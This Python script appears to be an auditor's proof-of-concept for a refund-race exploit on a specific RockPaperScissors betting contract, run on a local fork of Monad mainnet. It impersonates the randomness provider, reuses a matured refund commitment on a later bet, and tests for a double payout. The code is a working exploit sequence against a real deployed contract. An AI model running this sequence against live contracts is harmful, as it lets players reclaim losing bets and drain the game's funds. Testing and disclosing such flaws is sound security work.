#!/usr/bin/env python3
"""nar.bet — FORK ATTACK: the refund race (mandatory fork-attack phase).

Target: RockPaperScissors proxy 0x843d62ad… on a fork of Monad mainnet (chainId 143).
Goal:   decide, behaviourally, whether a player can get a bet refunded *after* the outcome
        is knowable — i.e. settle the wins and refund the losses.

Two questions, both asked with real state changes on a local fork:
  Q1 does a refund claim require the *current* request to be pending (kills it),
     or does a matured commitment survive the request it was made for (attack lives)?
  Q2 can a refunded player ALSO be paid out by the later callback (double-spend)?

Outcome delivery: the entropy proxy is impersonated and `_entropyCallback(uint64,address,bytes32)`
is called directly on the game proxy, so the random number is fully controlled. That is a
simulation of the real callback (msg.sender == entropy), not a bypass of it.

Nothing here touches mainnet: all writes go to 127.0.0.1:8555.
Output: fork/refund-attack.json (+ printed trace)
"""
import json, os, sys, time, urllib.request
from eth_abi import encode

RPC = "http://127.0.0.1:8555"
OUT = os.path.expanduser("~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet/fork")

RPS = "0x843d62ad75f5d0b383f8520e23d19174b7961b8e"
ENTROPY = "0xd458261e832415cfd3bae5e416fdf3230ce6f134"
PROVIDER = "0x52deaa1c84233f7bb8c8a45baede41091c616506"
NATIVE = "0x0000000000000000000000000000000000000000"

ACCT0 = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"   # the attacker (anvil, unlocked)
ACCT1 = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"   # the control player (fresh, never committed)

SEL_PLAY = "0x493e7930"        # RockPaperScissors_Play(uint256,address,uint8,uint32)
SEL_REFUND = "0x0f0aa179"      # RockPaperScissors_Refund()
SEL_STATE = "0xcfea2f6f"       # RockPaperScissors_GetState(address)
SEL_CB = "0x52a5f1f8"          # _entropyCallback(uint64,address,bytes32)
SEL_FEE = "0x5768c29a"         # getRandomFee()

_id = [0]
def rpc(method, params, timeout=60):
    _id[0] += 1
    body = json.dumps({"jsonrpc": "2.0", "id": _id[0], "method": method, "params": params}).encode()
    req = urllib.request.Request(RPC, data=body, headers={"Content-Type": "application/json"})
    try:
        d = json.loads(urllib.request.urlopen(req, timeout=timeout).read())
    except Exception as e:
        return {"exc": str(e)[:200]}
    if "error" in d:
        return {"error": d["error"]}
    return d.get("result")


ERRORS = {}
ABI = json.load(open(os.path.expanduser(
    "~/.hermes/workspace/SAVAGEAUD/TARGETS/narbet/recon/abi-real.json")))


def _canon(ins):
    if not ins:
        return []
    parts, depth, cur = [], 0, ""
    for ch in ins:
        if ch in "([":
            depth += 1
        elif ch in ")]":
            depth -= 1
        if ch == "," and depth == 0:
            parts.append(cur.strip()); cur = ""
        else:
            cur += ch
    if cur.strip():
        parts.append(cur.strip())
    out = []
    for p in parts:
        t = p.split()[0] if p.split() else p
        if t.startswith("tuple"):
            return None
        out.append(t)
    return out


from eth_utils import keccak
for n, s in ABI["errors"].items():
    t = _canon(s.get("inputs") or "")
    if t is None:
        continue
    ERRORS["0x" + keccak(text=f"{n}({','.join(t)})")[:4].hex()] = f"{n}({','.join(t)})"


def label_revert(res):
    if isinstance(res, dict) and res.get("error"):
        e = res["error"]
        data = (e.get("data") or "") if isinstance(e, dict) else ""
        if isinstance(data, dict):
            data = data.get("data", "")
        if data and data != "0x" and len(data) >= 10:
            return f"REVERT {ERRORS.get(data[:10], data[:10])}"
        return f"REVERT (empty data) {str(e)[:60]}"
    return None


def call(to, data, frm=ACCT0, value=0):
    return rpc("eth_call", [{"from": frm, "to": to, "data": data, "value": hex(value)}, "latest"])


def send(to, data, frm, value=0):
    h = rpc("eth_sendTransaction", [{"from": frm, "to": to, "data": data, "value": hex(value)}])
    if isinstance(h, dict) and h.get("error"):
        return None, h["error"]
    return h, None


def receipt(h):
    for _ in range(30):
        r = rpc("eth_getTransactionReceipt", [h])
        if r:
            return r
        time.sleep(0.3)
    return None


def bal(a):
    return int(rpc("eth_getBalance", [a, "latest"]), 16)


def mine(n=1):
    rpc("anvil_mine", [hex(n), "0x0"])


def block():
    return int(rpc("eth_blockNumber", []), 16)


def state(player):
    """RockPaperScissors_GetState(player) -> raw words (types unknown -> raw decode)."""
    r = call(RPS, SEL_STATE + "0" * 24 + player[2:].lower())
    if isinstance(r, dict):
        return r
    w = r[2:]
    return [int(w[i:i+64], 16) for i in range(0, len(w), 64)]


def play(player, wager, num_bets=1, action=0):
    fee = int(rpc("eth_call", [{"to": RPS, "data": SEL_FEE}, "latest"]), 16)
    data = SEL_PLAY + encode(["uint256", "address", "uint8", "uint32"],
                             [wager, NATIVE, action, num_bets]).hex()
    return send(RPS, data, player, value=wager * num_bets + fee), fee


def deliver_callback(seq, random_hex):
    """Impersonate the entropy proxy and hand the game an outcome of our choosing."""
    rpc("anvil_impersonateAccount", [ENTROPY])
    rpc("anvil_setBalance", [ENTROPY, hex(10**19)])
    data = SEL_CB + encode(["uint64", "address", "bytes32"],
                           [seq, PROVIDER, bytes.fromhex(random_hex[2:])]).hex()
    h, e = send(RPS, data, ENTROPY)
    if e:
        return None, e
    return receipt(h), None


def seq_of(player):
    """sequenceNumber the game holds for a pending request (word 0 of GetState)."""
    s = state(player)
    return s[0] if isinstance(s, list) and s else None


def main():
    log = {}
    print("fork block:", block(), " chainId:", rpc("eth_chainId", []))
    wager = 10**18

    # ---------- A. CONTROL: a fresh player who never committed ----------
    print("\n================ A. CONTROL (fresh player, no prior commitment) ================")
    before = bal(ACCT1)
    (h, e), fee = play(ACCT1, wager)
    print(f"  play() -> tx {h} err={e} (fee {fee/1e18})")
    rc = receipt(h) if h else None
    print("  play status:", rc["status"] if rc else None, " value paid:", wager + fee, "wei")
    rv = label_revert(call(RPS, SEL_REFUND, frm=ACCT1))
    print("  CONTROL Refund() immediately ->", rv)
    log["control_refund_immediate"] = rv
    s1 = state(ACCT1)
    print("  GetState(control) =", s1)
    seq1 = s1[0] if isinstance(s1, list) else None
    if seq1 is not None:
        rc_cb, e_cb = deliver_callback(seq1, "0x" + "11" * 32)
        print("  callback delivered:", (rc_cb or {}).get("status"), e_cb)
        print("  control balance delta:", bal(ACCT1) - before)

    # ---------- B. ATTACK: commit on bet A, reuse the matured commitment on bet B ----------
    print("\n================ B. ATTACK (commit on A -> settle -> mature -> reuse on B) ================")
    start = bal(ACCT0)
    wager = 10**18

    # B1. bet A
    (hA, eA), fee = play(ACCT0, wager)
    rcA = receipt(hA) if hA else None
    print(f"  B1 bet A: tx={hA} err={eA} status={rcA and rcA['status']} blk={rcA and int(rcA['blockNumber'],16)}")
    if not rcA or rcA["status"] != "0x1":
        print("  bet A FAILED — aborting:", label_revert({"error": {"data": (rcA or {}).get('revertReason','')}}))
        return
    seqA = seq_of(ACCT0)
    print("  B1 GetState:", state(ACCT0), " seqA =", seqA)

    # B2. commit a refund while A is pending
    rv_commit = label_revert(call(RPS, SEL_REFUND, frm=ACCT0))
    print("  B2 Refund() [commit] eth_call ->", rv_commit, "(None = would succeed)")
    hC, eC = send(RPS, SEL_REFUND, ACCT0)
    rcC = receipt(hC) if hC else None
    print(f"  B2 commit tx={hC} err={eC} status={rcC and rcC['status']} blk={rcC and int(rcC['blockNumber'],16)}")
    if rcC:
        print("     commit logs:", [(l["topics"][0][:12], l["address"][:12]) for l in rcC["logs"]])
    commit_blk = int(rcC["blockNumber"], 16) if rcC else None
    log["commit_tx"] = {"tx": hC, "err": eC, "block": commit_blk,
                        "logs": [l["topics"][0] for l in (rcC or {}).get("logs", [])]}

    # B3. settle bet A (a loss, chosen by us)
    if seqA is not None:
        rc_cb, e_cb = deliver_callback(seqA, "0x" + "22" * 32)
        print("  B3 settle A:", (rc_cb or {}).get("status"), e_cb,
              " blk", (rc_cb or {}).get("blockNumber"))
    print("  B3 GetState after settle:", state(ACCT0))
    rv_after = label_revert(call(RPS, SEL_REFUND, frm=ACCT0))
    print("  B3 Refund() right after settle ->", rv_after, "  <-- NotAwaitingVRF means request gone")

    # B4. mature the commitment
    mine(25)
    print("  B4 mined 25 blocks -> block", block())

    # B5. bet B
    (hB, eB), fee = play(ACCT0, wager)
    rcB = receipt(hB) if hB else None
    print(f"  B5 bet B: tx={hB} err={eB} status={rcB and rcB['status']} blk={rcB and int(rcB['blockNumber'],16)}")
    seqB = seq_of(ACCT0)
    print("  B5 GetState:", state(ACCT0), " seqB =", seqB)

    # B6. THE TEST — claim the (matured) commitment against bet B, loss not yet delivered
    bal_before_claim = bal(ACCT0)
    rv_claim = label_revert(call(RPS, SEL_REFUND, frm=ACCT0))
    print("\n  *** B6 Refund() against bet B (matured commitment, outcome NOT yet delivered) ->", rv_claim)
    hD, eD = send(RPS, SEL_REFUND, ACCT0)
    rcD = receipt(hD) if hD else None
    print(f"      claim tx={hD} err={eD} status={rcD and rcD['status']} blk={rcD and int(rcD['blockNumber'],16)}")
    if rcD:
        print("      claim logs:", [(l["topics"][0][:14], l["address"][:12]) for l in rcD["logs"]])
    after_claim = bal(ACCT0)
    print(f"      balance delta on claim: {(after_claim-bal_before_claim)/1e18:+.4f} MON")
    print("      GetState after claim:", state(ACCT0))

    # B7. deliver the losing outcome anyway -> double-spend check
    if seqB is not None:
        rc_cb, e_cb = deliver_callback(seqB, "0x" + "33" * 32)
        print("  B7 deliver LOSS for bet B after refund:", (rc_cb or {}).get("status"), e_cb)
    final = bal(ACCT0)
    print(f"  B7 final balance delta (whole attack, from {start}): {(final-start)/1e18:+.4f} MON")

    log.update({
        "attack": {
            "start_balance": start, "final_balance": final,
            "net_mon": (final - start) / 1e18,
            "refund_immediate_after_settle": rv_after,
            "refund_against_bet_B": rv_claim,
            "claim_tx_status": rcD and rcD["status"],
            "claim_tx_logs": [l["topics"][0] for l in (rcD or {}).get("logs", [])],
            "commit_block": commit_blk, "total_wagered": 2 * 1e18,
        },
        "control": {"refund_immediate": log.get("control_refund_immediate")},
    })
    p = os.path.join(OUT, "refund-attack.json")
    json.dump(log, open(p, "w"), indent=1)
    print("\nsaved", p)


if __name__ == "__main__":
    main()
